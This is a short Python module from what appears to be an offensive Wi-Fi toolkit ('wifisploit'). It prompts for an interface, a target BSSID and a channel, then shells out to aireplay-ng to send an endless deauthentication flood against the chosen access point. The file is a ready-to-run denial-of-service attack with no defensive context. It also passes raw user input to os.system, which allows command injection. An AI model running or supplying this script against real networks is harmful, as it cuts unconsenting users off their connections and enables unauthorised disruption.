# wifisploit/modules/dos_attack.py

import os
from pystyle import Colorate, Colors
from colorama import init
init(autoreset=True)

gradient_colors = Colors.red_to_white

interface = input(Colorate.Horizontal(gradient_colors, "wsf (interface) > "))
if interface.lower() == 'back':
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Interface => {interface}"))

bssid = input(Colorate.Horizontal(gradient_colors, "wsf (bssid)> "))
if bssid.lower() == 'back':
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"BSSID => {bssid}"))

channel = input(Colorate.Horizontal(gradient_colors, "wsf (channel) > "))
if channel.lower() == 'back':
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Channel => {channel}"))

os.system(f'iwconfig {interface} channel {channel}')
os.system(f'aireplay-ng --deauth 0 -a {bssid} {interface}')